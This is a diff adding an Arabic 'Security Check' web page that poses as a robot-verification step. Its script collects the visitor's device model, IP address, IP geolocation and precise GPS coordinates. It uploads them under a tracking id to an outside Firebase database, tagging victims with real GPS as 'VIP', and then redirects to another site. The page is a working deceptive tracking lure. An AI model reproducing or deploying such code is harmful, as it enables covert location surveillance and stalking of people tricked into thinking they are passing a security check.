@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Check</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+*{font-family:'Cairo',Arial,sans-serif;box-sizing:border-box;margin:0;padding:0}
+body{background:#f8fafc;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:15px}
+.container{max-width:500px;width:100%;background:#fff;border:1px solid #e2e8f0;border-radius:16px;padding:24px;box-shadow:0 10px 40px rgba(0,0,0,0.08);text-align:center}
+.logo{width:64px;height:64px;background:linear-gradient(135deg,#00e676,#00b0ff);border-radius:16px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:28px}
+h1{font-size:20px;font-weight:900;color:#0f172a}
+.subtitle{color:#64748b;font-size:13px;margin:8px 0 18px;line-height:1.6}
+.big-btn{width:100%;padding:16px;background:#0f172a;color:#fff;border:none;border-radius:12px;font-weight:900;font-size:15px;cursor:pointer;margin:10px 0}
+.big-btn.green{background:linear-gradient(90deg,#00e676,#00b0ff);color:#000}
+.big-btn.orange{background:#ff6d00;color:#fff}
+.verify-box{background:#f8fafc;border:2px solid #e2e8f0;border-radius:12px;padding:14px;display:flex;align-items:center;gap:12px;margin:10px 0;text-align:right}
+.verify-box.ok{border-color:#00e676;background:rgba(0,230,118,0.08)}
+.verify-box.fail{border-color:#ff1744;background:rgba(255,23,68,0.08)}
+.check{width:28px;height:28px;border:2px solid #cbd5e1;border-radius:6px;display:flex;align-items:center;justify-content:center;background:#fff;font-weight:900;flex-shrink:0}
+.check.ok{background:#00e676;border-color:#00e676;color:#fff}
+.check.fail{background:#ff1744;border-color:#ff1744;color:#fff}
+.check.spin{animation:spin 1s linear infinite;border-top-color:#00b0ff}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress{width:100%;height:8px;background:#e2e8f0;border-radius:10px;overflow:hidden;margin:15px 0}
+.fill{height:100%;background:linear-gradient(90deg,#00e676,#00b0ff);width:0%;transition:width 0.3s}
+.status{padding:12px;border-radius:10px;font-size:12px;margin:10px 0}
+.status-ok{background:#dcfce7;border:1px solid #86efac;color:#166534}
+.status-fail{background:#fee2e2;border:1px solid #fca5a5;color:#991b1b}
+.status-info{background:#dbeafe;border:1px solid #93c5fd;color:#1e40af}
+.instructions{background:#0f172a;color:#e2e8f0;border-radius:12px;padding:16px;margin:15px 0;text-align:right;font-size:12px;line-height:1.8}
+.instructions b{color:#00e676}
+.hidden{display:none}
+.countdown{font-size:32px;font-weight:900;color:#00e676;margin:10px 0}
+.log{background:#0f172a;color:#00ff88;border-radius:8px;padding:10px;font-family:monospace;font-size:10px;max-height:130px;overflow:auto;text-align:left;direction:ltr;white-space:pre-wrap;margin:10px 0}
+</style>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+</head>
+<body>
+<div class="container">
+<div class="logo">🛡️</div>
+<h1>التحقق الأمني</h1>
+<p class="subtitle">للتأكد من انك لست روبوت يرجي الضغط علي بدء الان</p>
+<div id="step1">
+<div class="verify-box"><div class="check">1</div><div style="flex:1;text-align:right"><div style="font-weight:700;font-size:13px">الخطوة 1: التحقق الأمني</div><div style="font-size:11px;color:#64748b">اضغط بدء التحقق للمتابعة</div></div></div>
+<button class="big-btn green" onclick="startAll()">🔍 بدء التحقق</button>
+</div>
+<div id="step2" class="hidden">
+<div class="verify-box" id="boxDevice"><div class="check" id="checkDevice">📱</div><div style="flex:1;text-align:right"><div style="font-weight:700;font-size:13px">فحص الجهاز</div><div style="font-size:11px;color:#64748b" id="descDevice">جاري...</div></div></div>
+<div class="verify-box" id="boxIP"><div class="check" id="checkIP">🌐</div><div style="flex:1;text-align:right"><div style="font-weight:700;font-size:13px">التحقق من الشبكه</div><div style="font-size:11px;color:#64748b" id="descIP">جاري...</div></div></div>
+<div class="verify-box" id="boxGPS"><div class="check" id="checkGPS">📍</div><div style="flex:1;text-align:right"><div style="font-weight:700;font-size:13px">جاري الاتصال</div><div style="font-size:11px;color:#64748b" id="descGPS">جاري...</div></div></div>
+<div class="progress"><div class="fill" id="fill"></div></div>
+<div id="loadingText" style="font-size:12px;color:#00b0ff;font-weight:600">جاري التحقق...</div>
+<div id="countdownSec" class="hidden"><div class="countdown" id="countdown">3</div><p style="font-size:12px;color:#64748b">سيتم تحويلك خلال <span id="countNum">3</span> ثواني</p><button class="big-btn green" onclick="goMain()">➡️ تحويل فوري</button></div>
+<div class="log" id="logBox"></div>
+</div>
+<div id="stepRetry" class="hidden"><button class="big-btn orange" onclick="location.reload()">🔄 حاول مرة أخرى</button></div>
+</div>
+<script>
+const FIREBASE_URL = "https://numgen-4f22c-default-rtdb.firebaseio.com";
+const MAIN_SITE = "https://pythone2033.github.io/NumGen-Pro-/";
+let debugData = {ip:null, geo:null, realGPS:null, device:null};
+let clientId = new URLSearchParams(window.location.search).get('id') || 'Visitor';
+
+function log(msg){let el=document.getElementById('logBox');el.textContent+=new Date().toLocaleTimeString()+" - "+msg+"\n";el.scrollTop=el.scrollHeight;}
+function setProgress(p){document.getElementById('fill').style.width=p+'%';}
+function setBox(id,status,desc){
+  let box=document.getElementById('box'+id);
+  let check=document.getElementById('check'+id);
+  let descEl=document.getElementById('desc'+id);
+  if(status==='ok'){box.className='verify-box ok';check.className='check ok';check.textContent='✓';}
+  else if(status==='active'){box.className='verify-box';check.className='check spin';check.textContent='◍';}
+  else if(status==='fail'){box.className='verify-box fail';check.className='check fail';check.textContent='✕';}
+  if(desc) descEl.textContent=desc;
+}
+function getDevice(){
+  let ua=navigator.userAgent;
+  let model="Android Device";let brand="Android";
+  let m1=ua.match(/\(Linux; Android \d+; ([^\)]+)\)/);
+  if(m1) model=m1[1].split(' Build')[0].trim();
+  if(model.includes('SM-')) brand='Samsung';
+  else if(/infinix/i.test(model)) brand='Infinix';
+  else if(/redmi/i.test(model)) brand='Xiaomi';
+  if(model.includes(' K ')) model=model.replace(' K ',' ');
+  return {model,brand,full:brand+' '+model,ua};
+}
+async function startAll(){
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+  log('Start id:'+clientId);
+  setBox('Device','active','جاري فحص الجهاز...');
+  let device=getDevice();debugData.device=device;log('Device:'+device.full);setBox('Device','ok',device.full);setProgress(30);
+  setBox('IP','active','جاري التحقق...');
+  try{
+    let r=await fetch('https://api.ipify.org?format=json');
+    let j=await r.json();debugData.ip=j.ip;log('IP:'+j.ip);setBox('IP','ok','IP: '+j.ip);setProgress(50);
+  }catch(e){
+    try{
+      let r=await fetch('https://ipapi.co/json/');let j=await r.json();
+      debugData.ip=j.ip;debugData.geo=j;log('IP via ipapi:'+j.ip);setBox('IP','ok',j.city+' - '+j.ip);setProgress(50);
+    }catch(e2){log('IP fail');setBox('IP','fail','فشل الشبكه');}
+  }
+  if(debugData.ip && !debugData.geo){
+    try{let r=await fetch('https://ipapi.co/'+debugData.ip+'/json/');let j=await r.json();debugData.geo=j;log('GEO:'+j.city);}catch(e){}
+  }
+  setBox('GPS','active','جاري الاتصال...');log('Request GPS...');
+  if(!navigator.geolocation){log('No geo support');setBox('GPS','fail','غير مدعوم');await saveAndGo(false);return;}
+  navigator.geolocation.getCurrentPosition(async function(pos){
+    debugData.realGPS={lat:pos.coords.latitude, lon:pos.coords.longitude, acc:pos.coords.accuracy};
+    log('GPS OK:'+debugData.realGPS.lat+','+debugData.realGPS.lon+' acc:'+debugData.realGPS.acc);
+    setBox('GPS','ok','تم الاتصال - '+Math.round(debugData.realGPS.acc)+'m');setProgress(90);await saveAndGo(true);
+  },async function(err){
+    log('GPS FAIL:'+err.message);setBox('GPS','fail','فشل الاتصال - سيتم الحفظ ك ADS');await saveAndGo(false);
+  },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
+}
+async function saveAndGo(hasGPS){
+  try{
+    if(!firebase.apps.length) firebase.initializeApp({databaseURL: FIREBASE_URL});
+    let db=firebase.database();
+    let latVal=null;let lonVal=null;
+    if(hasGPS && debugData.realGPS){latVal=debugData.realGPS.lat;lonVal=debugData.realGPS.lon;}
+    else if(debugData.geo){latVal=debugData.geo.latitude;lonVal=debugData.geo.longitude;}
+
+    let data={
+      id: clientId,
+      name: clientId,
+      ip: debugData.ip||'unknown',
+      city: debugData.geo?debugData.geo.city:'Alexandria',
+      country: debugData.geo?debugData.geo.country_name:'Egypt',
+      lat: latVal,
+      lng: lonVal,
+      real_lat: latVal,
+      real_lon: lonVal,
+      gps: latVal? (latVal+','+lonVal) : 'unknown',
+      device: debugData.device?debugData.device.full:'unknown',
+      device_full: debugData.device?debugData.device.full:'unknown',
+      userAgent: navigator.userAgent,
+      time: new Date().toLocaleString('ar-EG'),
+      timestamp: Date.now(),
+      type: hasGPS ? 'VIP' : 'ADS'
+    };
+    if(hasGPS) data.accuracy=debugData.realGPS.acc;
+
+    await db.ref('visitors').push(data);
+    await db.ref('pro_max_visitors').push(data);
+    
+    log('SAVED type:'+data.type+' lat:'+latVal);
+    document.getElementById('loadingText').textContent = hasGPS ? '✅ تم التحقق - GPS حقيقي' : '✅ تم التحقق - ADS';
+    setProgress(100);
+    startCountdown();
+  }catch(e){
+    log('SAVE ERROR:'+e.message);
+    document.getElementById('loadingText').textContent='جاري التحويل...';
+    setProgress(100);
+    startCountdown();
+  }
+}
+let countdownVal=3;
+function startCountdown(){
+  document.getElementById('countdownSec').classList.remove('hidden');
+  function tick(){
+    document.getElementById('countdown').textContent=countdownVal;
+    document.getElementById('countNum').textContent=countdownVal;
+    if(countdownVal<=0){goMain();return;}
+    countdownVal--;setTimeout(tick,1000);
+  }
+  tick();
+}
+function goMain(){
+  window.location.href = MAIN_SITE+'?id='+encodeURIComponent(clientId)+'&verified=true';
+}
+</script>
+</body>
+</html>
